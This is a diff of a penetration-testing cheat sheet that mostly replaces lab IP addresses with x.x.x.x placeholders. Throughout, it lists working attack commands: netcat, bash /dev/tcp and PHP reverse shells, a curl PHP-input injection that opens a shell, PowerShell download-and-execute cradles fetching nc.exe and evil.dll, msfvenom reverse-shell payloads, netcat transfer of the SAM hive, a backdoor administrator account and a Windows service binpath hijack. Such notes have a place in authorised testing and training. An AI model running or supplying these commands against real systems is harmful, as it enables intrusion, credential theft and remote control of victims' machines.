@@ -1,19 +1,23 @@
 Nmap Scans
 -----------
-Aggressive Scan, Top Ports:   nmap -sC -sV 10.10.10.102 -oA Top-Ports_10.10.10.102
-Full Port Scan:               nmap -p- 10.10.10.102 -max-retries=2 -oA All_ports_10.10.10.102
-Aggressive Service Scan:      nmap -sC -sV -p 21,22,80,5435,8082,9092 10.10.10.102 -oA Full-Service_Scan_10.10.10.102
+Aggressive Scan, Top Ports:   nmap -sC -sV x.x.x.x -oA Top-Ports
+Full Port Scan:               nmap -p- x.x.x.x -max-retries=2 -oA All_ports
+Aggressive Service Scan:      nmap -sC -sV -p 21,22,80,5435,8082,9092 x.x.x.x -oA Full-Service_Scan
 
 
-Web
-====
+Web-Discovery
+=============
 DirSearch
 ---------
- ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.30.53/ -e *
+dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://x.x.x.x/ -e *
+
+Nikto
+-----
+nikto -h x.x.x.x
 
 wpscan
 ------
-wpscan --enumerate p,u,t -disable-tls-checks --url http://
+wpscan --enumerate p,u,t -disable-tls-checks --url http://x.x.x.x
 
 Dumping Hashes -Windows
 =======================
@@ -27,8 +31,6 @@ Password Cracking - Linux
 unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
 john --rules --wordlist=wordlist.txt unshadowed.txt
 
-
-
 FTP file Transfer
 =================
 echo open 10.11.0.141 21> ftp.txt
@@ -41,20 +43,11 @@ ftp -v -n -s:ftp.txt
 
 NetCat File Transfer
 =====================
-Sending Machine: nc.exe 10.11.0.141 1236 < sam.save
+Sending Machine: nc.exe x.x.x.x 1236 < sam.save
 Receiving Machine: nc -nvlp 1236 > system.save
 
-nc 192.168.44.55 1236 < accesschk.exe
+nc x.x.x.x 1236 < accesschk.exe
 nc.exe -nlp 1236 > accesschk.exe
-
-
-BO
-==
-If the program we are exploiting is a threaded application (which it is, we can try to avoid crashing the service completely, by using an ExitThread method
-instead, which will just terminate the affected thread of the program. This will make our exploit work without interrupting the usual operations of the POP3 server, as well
-as allow us to repeatedly exploit the server, and exit the shell without bringing down the service. To instruct msfvenom to use the ExitThread method during the shellcode
-generation, we can issue the following command:
-msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
 
 Adding an Elevated User
 =======================
@@ -62,8 +55,8 @@ net user hax0r hax0r /add && net localgroup Administrators hax0r /add
 
 Spawning shell with nc
 ======================
-./nc.exe -nv 192.168.44.31 1316 -e cmd.exe
-nc -e /bin/sh 10.10.10.10 1234
+./nc.exe -nv x.x.x.x 1316 -e cmd.exe
+nc -e /bin/sh x.x.x.x 1234
 
 Bin/bash Shell
 ==============
@@ -80,8 +73,8 @@ Simple PHP Command Injection
 <?php echo shell_exec('bash -i >& /dev/tcp/192.168.30.31/12345 0>&1'); ?>
 
 
-bash -i >& /dev/tcp/10.11.0.141/1313 0>&1
-curl -s --data "<?system('nc -lvp 1313 -e /bin/sh');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
+bash -i >& /dev/tcp/x.x.x.x/1313 0>&1
+curl -s --data "<?system('nc -lvp 1313 -e /bin/sh');?>" "http://x.x.x.x/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
 
 Windows Powershell
 ==================
@@ -89,20 +82,20 @@ Nishang -PS reverse tcp
 Copy the .Example to the bottom of the script
 Invoke-PowershellTcp -Reverse -IPAddress 192.10.10.23 -Port 1313
 
-Downloading from PS prompt:IEX(New-Object Net.Webclient).downloadString('http://192.168.44.31:8000/nc.exe')
-(New-Object System.Net.WebClient).DownloadFile("http://192.168.44.31:8000/nc.exe", "C:\Windows\Temp\Privesc\nc.exe")  
-(New-Object System.Net.WebClient).DownloadFile("http://192.168.44.31:8000/wlbsctrl.dll", "C:\Windows\Temp\Privesc\wlbsctrl.dll")  
-Downloading via code Injecton: C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.Webclient).downloadString('http://192.168.44.31:8000/wlbsctrl.dll')
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (New-Object Net.Webclient).downloadFile('http://192.168.44.31:8000/nc.exe', 'C:\Python\nc.exe')
+Downloading from PS prompt:IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/nc.exe')
+(New-Object System.Net.WebClient).DownloadFile("http://x.x.x.x:8000/nc.exe", "C:\Windows\Temp\Privesc\nc.exe")  
+(New-Object System.Net.WebClient).DownloadFile("http://x.x.x.x:8000/wlbsctrl.dll", "C:\Windows\Temp\Privesc\wlbsctrl.dll")  
+Downloading via code Injecton: C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.Webclient).downloadString('http:/x.x.x.x:8000/wlbsctrl.dll')
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (New-Object Net.Webclient).downloadFile('http://x.x.x.x:8000/nc.exe', 'C:\Python\nc.exe')
 
-powershell.exe (New-Object System.Net.WebClient).DownloadFile("http://192.168.44.31:8000/evil.dll", "C:\Windows\Temp\Privesc\evil.dll")
-powershell.exe IEX(New-Object Net.Webclient).downloadString('http://192.168.44.31:8000/Sherlock.ps1')
+powershell.exe (New-Object System.Net.WebClient).DownloadFile("http://x.x.x.x:8000/evil.dll", "C:\Windows\Temp\Privesc\evil.dll")
+powershell.exe IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/Sherlock.ps1')
 
 Mfsvenom
 ========
-msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.30.31 LPORT=1313 -b "\x00\x0a\x0d" -f python -- BO (NetCat)
+msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=1313 -b "\x00\x0a\x0d" -f python -- BO (NetCat)
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<> LPORT=<> -f raw > shell.jsp
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.141 LPORT=1313 -f asp > shell.asp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1313 -f asp > shell.asp
 
 Windows PrivEsc
 ===============
@@ -114,7 +107,7 @@ Powesploit -PowerUp (Invoke AllChecks)
 
 Windows-Privesc Checker -- git clone https://github.com/pentestmonkey/windows-privesc-check.git
 
-sc config upnphost binpath= "C:\Python\nc.exe -nv 192.168.44.31 1320 -e C:\WINDOWS\System32\cmd.exe"
+sc config upnphost binpath= "C:\Python\nc.exe -nv x.x.x.x 1320 -e C:\WINDOWS\System32\cmd.exe"
 sc config upnphost obj= ".\LocalSystem" password= ""
 sc qc upnphost
 
@@ -131,13 +124,13 @@ Linux PrivEsc
 uname -a
 sudo -l
 LinuxEnum Scripts
-check for setuid scripts < find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null >
+check for setuid scripts: find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null 
 World rewritable /etc/passwd
 virtualhosting to access web instead of ubuntu Apache page, the bank + cronos
 
 Port Knocking
 ==============
-for x in 11 1 111; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 192.168.44.53; done
+for x in 11 1 111; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x x.x.x.x; done
 
 
 
